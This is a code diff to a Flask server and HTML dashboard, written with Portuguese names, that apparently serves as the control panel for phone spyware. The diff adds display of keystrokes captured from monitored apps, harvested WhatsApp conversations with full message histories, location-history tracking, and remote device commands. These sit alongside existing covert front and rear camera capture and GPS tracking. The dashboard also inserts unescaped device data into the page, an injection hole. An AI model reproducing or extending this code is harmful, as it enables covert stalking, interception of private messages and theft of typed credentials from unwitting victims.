@@ -34,8 +34,10 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .info-box span { font-size: 10px; color: #64748b; display: block; text-transform: uppercase; margin-bottom: 4px; }
         .info-box strong { font-size: 18px; color: #f1f5f9; }
         .map-container { width: 100%; height: 300px; border-radius: 8px; border: 1px solid #1e293b; margin-bottom: 10px; }
-        .btn-maps { display: block; width: 100%; background: #22c55e; color: #fff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; margin-bottom: 15px; }
-        .btn-camera { display: block; width: 100%; background: #38bdf8; color: #0a0a0a; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 20px; }
+        .btn-row { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
+        .btn-maps { flex: 1; background: #22c55e; color: #fff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 11px; min-width: 70px; }
+        .btn-cmd { background: #f59e0b; color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 11px; cursor: pointer; flex: 1; min-width: 70px; }
+        .btn-camera { display: block; width: 100%; background: #38bdf8; color: #0a0a0a; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 10px; }
         .btn-camera:disabled { opacity: 0.5; cursor: not-allowed; }
         .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
         @media(max-width: 600px) { .cameras-row { grid-template-columns: 1fr; } }
@@ -44,6 +46,30 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .cam-frame { width: 100%; aspect-ratio: 4/3; background: #000; display: flex; align-items: center; justify-content: center; }
         .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
         .cam-placeholder { font-size: 11px; color: #334155; text-transform: uppercase; }
+        
+        .whatsapp-section { margin-bottom: 15px; }
+        .whatsapp-section h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
+        .chat-list { display: flex; flex-direction: column; gap: 6px; }
+        .chat-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; cursor: pointer; transition: all 0.2s; }
+        .chat-card:hover { border-color: #25d366; }
+        .chat-card-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; }
+        .chat-card-header .pessoa { color: #25d366; font-weight: bold; font-size: 12px; }
+        .chat-card-header .info { display: flex; gap: 10px; align-items: center; }
+        .chat-card-header .total { background: #25d366; color: #000; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold; }
+        .chat-card-header .ultima { color: #64748b; font-size: 10px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .chat-card-body { display: none; padding: 0 12px 10px 12px; max-height: 250px; overflow-y: auto; }
+        .chat-card.aberto .chat-card-body { display: block; }
+        .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; }
+        .chat-msg.recebida { color: #94a3b8; }
+        .chat-msg.enviada { color: #38bdf8; text-align: right; }
+        .chat-msg.midia { color: #f59e0b; }
+        .chat-msg .hora { color: #64748b; font-size: 9px; }
+        
+        .keylog-box { background: #0a0a0a; border: 2px solid #ef4444; padding: 10px; border-radius: 8px; margin-bottom: 15px; }
+        .keylog-box.ativo { border-color: #22c55e; animation: pulse 1s infinite; }
+        .keylog-box .app-nome { color: #f59e0b; font-weight: bold; text-transform: uppercase; }
+        .keylog-box .keylog-texto { color: #38bdf8; font-size: 12px; margin-top: 5px; word-break: break-all; }
+        
         .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
         .error-box p { color: #fca5a5; font-weight: bold; }
         .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
@@ -74,8 +100,25 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     <div class="info-box"><span>📶 Rede</span><strong id="txt_network">{{ info_moto.get('network', '--') }}</strong></div>
                 </div>
                 <div id="map_private" class="map-container"></div>
-                <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">🗺️ Google Maps</a>
+                <div class="btn-row">
+                    <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">🗺️ Maps</a>
+                    <button class="btn-cmd" onclick="enviarComando('vibrar')">📳</button>
+                    <button class="btn-cmd" onclick="enviarComando('som')">🔊</button>
+                    <button class="btn-cmd" onclick="enviarComando('lanterna')">💡</button>
+                </div>
                 <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Captura Sincronizada</button>
+                
+                <div id="keylogBox" class="keylog-box">
+                    <p>⌨️ Nenhum app monitorado aberto</p>
+                </div>
+                
+                <div class="whatsapp-section">
+                    <h3>💬 WhatsApp</h3>
+                    <div id="chatList" class="chat-list">
+                        <p style="color:#64748b;font-size:11px;">Nenhuma conversa recente</p>
+                    </div>
+                </div>
+                
                 <div class="cameras-row">
                     <div class="cam-card"><div class="cam-card-title">🎥 Câmera Frontal</div><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront" src="" alt="Frontal"></div></div>
                     <div class="cam-card"><div class="cam-card-title">🎥 Câmera Traseira</div><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack" src="" alt="Traseira"></div></div>
@@ -85,11 +128,30 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 let map = L.map('map_private', { zoomControl: true }).setView([{{ info_moto.lat }}, {{ info_moto.lon }}], 17);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                 let marker = L.marker([{{ info_moto.lat }}, {{ info_moto.lon }}]).addTo(map);
+                let historico = L.polyline([], {color: '#38bdf8', weight: 3}).addTo(map);
+                let pontos = [[{{ info_moto.lat }}, {{ info_moto.lon }}]];
+                let chatsAbertos = {};
+                
+                function enviarComando(acao) {
+                    fetch('/api/comando_remoto/{{ id_buscado }}', {
+                        method: 'POST', body: JSON.stringify({acao: acao}),
+                        headers: {'Content-Type': 'application/json'}
+                    });
+                }
+                
+                function toggleChat(pessoa, card) {
+                    if (card.classList.contains('aberto')) {
+                        card.classList.remove('aberto');
+                        delete chatsAbertos[pessoa];
+                    } else {
+                        card.classList.add('aberto');
+                        chatsAbertos[pessoa] = true;
+                    }
+                }
                 
                 async function dispararCapturaDupla() {
                     const btn = document.getElementById('btnCam');
-                    btn.innerText = "⏳ Sincronizando...";
-                    btn.disabled = true;
+                    btn.innerText = "⏳ Sincronizando..."; btn.disabled = true;
                     try {
                         await fetch('/api/comando_camera/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'take_dual'}), headers: {'Content-Type': 'application/json'} });
                         let t = 0;
@@ -116,11 +178,49 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             document.getElementById('txt_bateria').innerText = d.battery + '%';
                             document.getElementById('txt_uptime').innerText = d.uptime || '--';
                             document.getElementById('txt_network').innerText = d.network || '--';
+                            
                             let lat = parseFloat(d.lat), lon = parseFloat(d.lon);
                             if (lat && lon) {
-                                marker.setLatLng([lat, lon]);
-                                map.panTo([lat, lon]);
+                                marker.setLatLng([lat, lon]); map.panTo([lat, lon]);
                                 document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+                                pontos.push([lat, lon]); if(pontos.length > 50) pontos.shift();
+                                historico.setLatLngs(pontos);
+                            }
+                            
+                            let kb = document.getElementById('keylogBox');
+                            if(d.keylog && d.keylog.ativo) {
+                                kb.className = 'keylog-box ativo';
+                                let textoHtml = d.keylog.texto ? `<div class="keylog-texto">📝 ${d.keylog.texto}</div>` : '';
+                                kb.innerHTML = `<p>⌨️ <span class="app-nome">${d.keylog.app}</span> monitorado${textoHtml}</p>`;
+                            } else {
+                                kb.className = 'keylog-box';
+                                kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
+                            }
+                            
+                            if(d.whatsapp && d.whatsapp.length > 0) {
+                                let html = '';
+                                d.whatsapp.forEach(chat => {
+                                    let temMidia = chat.midia ? '📎 ' : '';
+                                    let aberto = chatsAbertos[chat.pessoa] ? ' aberto' : '';
+                                    html += `<div class="chat-card${aberto}" onclick="toggleChat('${chat.pessoa}', this)">
+                                        <div class="chat-card-header">
+                                            <span class="pessoa">👤 ${chat.pessoa}</span>
+                                            <div class="info">
+                                                <span class="ultima">${temMidia}${chat.ultima_msg || ''}</span>
+                                                <span class="total">${chat.total}</span>
+                                            </div>
+                                        </div>
+                                        <div class="chat-card-body">`;
+                                    if(chat.mensagens) {
+                                        chat.mensagens.slice().reverse().forEach(msg => {
+                                            let cls = 'chat-msg ' + (msg.tipo || 'recebida');
+                                            if(msg.midia) cls += ' midia';
+                                            html += `<div class="${cls}"><span class="tipo-tag">${msg.tipo === 'enviada' ? '📤' : '📥'}</span> ${msg.texto} <span class="hora">${msg.hora}</span></div>`;
+                                        });
+                                    }
+                                    html += `</div></div>`;
+                                });
+                                document.getElementById('chatList').innerHTML = html;
                             }
                         }
                     } catch(e) {}
@@ -134,9 +234,7 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
-    id_buscado = None
-    info_moto = None
-    erro = None
+    id_buscado = None; info_moto = None; erro = None
     if request.method == 'POST':
         id_buscado = request.form.get('target_id', '').strip().upper()
         if id_buscado in db_dispositivos: info_moto = db_dispositivos[id_buscado]
@@ -148,7 +246,7 @@ def api_status(device_id):
     device_id = device_id.upper()
     if device_id in db_dispositivos:
         d = db_dispositivos[device_id]
-        return jsonify({"battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"), "lat": d.get("lat",0), "lon": d.get("lon",0), "network": d.get("network","N/A")}), 200
+        return jsonify({"battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"), "lat": d.get("lat",0), "lon": d.get("lon",0), "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[]), "keylog": d.get("keylog")}), 200
     return jsonify({"error": "Not found"}), 404
 
 @app.route('/update', methods=['POST'])
@@ -157,56 +255,42 @@ def update():
     device_id = data.get('device_id', '').upper()
     if not device_id: return jsonify({"status": "error"}), 400
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    db_dispositivos[device_id].update({
-        "battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"),
-        "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)),
-        "network": data.get("network","N/A"), "last_seen": datetime.utcnow().isoformat()
-    })
-    cmd = db_dispositivos[device_id].get("cmd_cam", "wait")
-    db_dispositivos[device_id]["cmd_cam"] = "wait"
-    return jsonify({"status": "success", "comando_cam": cmd}), 200
+    db_dispositivos[device_id].update({"battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"), "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)), "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]), "keylog": data.get("keylog"), "last_seen": datetime.utcnow().isoformat()})
+    cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
+    cmd_remoto = db_dispositivos[device_id].get("cmd_remoto", "none")
+    db_dispositivos[device_id]["cmd_cam"] = "wait"; db_dispositivos[device_id]["cmd_remoto"] = "none"
+    return jsonify({"status": "success", "comando_cam": cmd_cam, "comando_remoto": cmd_remoto}), 200
 
 @app.route('/api/comando_camera/<device_id>', methods=['POST'])
 def comando_camera(device_id):
     device_id = device_id.upper()
-    data = request.get_json(force=True, silent=True) or {}
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    db_dispositivos[device_id]["cmd_cam"] = data.get("acao", "wait")
-    db_dispositivos[device_id]["photo_front"] = ""
-    db_dispositivos[device_id]["photo_back"] = ""
+    db_dispositivos[device_id]["cmd_cam"] = "take_dual"
+    db_dispositivos[device_id]["photo_front"] = ""; db_dispositivos[device_id]["photo_back"] = ""
+    return jsonify({"status": "ok"}), 200
+
+@app.route('/api/comando_remoto/<device_id>', methods=['POST'])
+def comando_remoto(device_id):
+    device_id = device_id.upper()
+    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
+    db_dispositivos[device_id]["cmd_remoto"] = (request.get_json(force=True, silent=True) or {}).get("acao", "none")
     return jsonify({"status": "ok"}), 200
 
 @app.route('/api/upload_lote', methods=['POST'])
 def upload_lote():
-    """RECEBE AS DUAS FOTOS EM UM ÚNICO PACOTE"""
     data = request.get_json(force=True, silent=True) or {}
     dev_id = data.get("device_id", '').upper()
     if dev_id and dev_id in db_dispositivos:
-        if data.get("photo_front"):
-            db_dispositivos[dev_id]["photo_front"] = data["photo_front"]
-        if data.get("photo_back"):
-            db_dispositivos[dev_id]["photo_back"] = data["photo_back"]
-        logger.info(f"LOTE recebido de {dev_id}")
+        if data.get("photo_front"): db_dispositivos[dev_id]["photo_front"] = data["photo_front"]
+        if data.get("photo_back"): db_dispositivos[dev_id]["photo_back"] = data["photo_back"]
         return jsonify({"status": "stored"}), 200
     return jsonify({"status": "error"}), 404
-
-@app.route('/api/upload_camera', methods=['POST'])
-def upload_camera():
-    data = request.get_json(force=True, silent=True) or {}
-    dev_id = data.get("device_id", '').upper()
-    tipo = data.get("tipo")
-    foto = data.get("photo", "")
-    if dev_id and dev_id in db_dispositivos and foto:
-        db_dispositivos[dev_id][f"photo_{tipo}"] = foto
-        return jsonify({"status": "stored"}), 200
-    return jsonify({"status": "error"}), 400
 
 @app.route('/api/get_camera/<device_id>')
 def get_camera(device_id):
     device_id = device_id.upper()
     if device_id in db_dispositivos:
-        pf = db_dispositivos[device_id].get("photo_front", "")
-        pb = db_dispositivos[device_id].get("photo_back", "")
+        pf = db_dispositivos[device_id].get("photo_front", ""); pb = db_dispositivos[device_id].get("photo_back", "")
         return jsonify({"photo_front": pf, "photo_back": pb, "pronto": bool(pf and pb)}), 200
     return jsonify({"photo_front": "", "photo_back": "", "pronto": False}), 404
 
